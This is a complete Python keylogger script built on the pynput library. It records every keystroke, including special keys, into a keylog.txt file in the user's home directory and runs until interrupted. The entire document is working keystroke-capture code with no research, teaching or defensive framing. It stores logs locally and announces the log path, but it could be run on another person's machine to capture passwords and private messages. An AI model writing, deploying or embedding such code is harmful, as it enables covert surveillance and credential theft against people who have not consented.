import time
import os
from pynput import keyboard

# ========== CONFIGURATION ==========
HOME_DIR = os.path.expanduser("~")  
LOG_FILE = os.path.join(HOME_DIR, "keylog.txt") 

# ========== FUNCTION TO RECORD KEYS ==========
def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            else:
                file.write(f" [{key}] ")
    except Exception as e:
        print(f"[Keylog Error] {e}")

# ========== START KEY LOGGER LISTENER ==========
listener = keyboard.Listener(on_press=on_press)
listener.start()

# ========== KEEP THE PROGRAM RUNNING ==========
print(f"Logging keystrokes to: {LOG_FILE}")
try:
    while True:
        time.sleep(10)  
except KeyboardInterrupt:
    print("Keylogger stopped.")
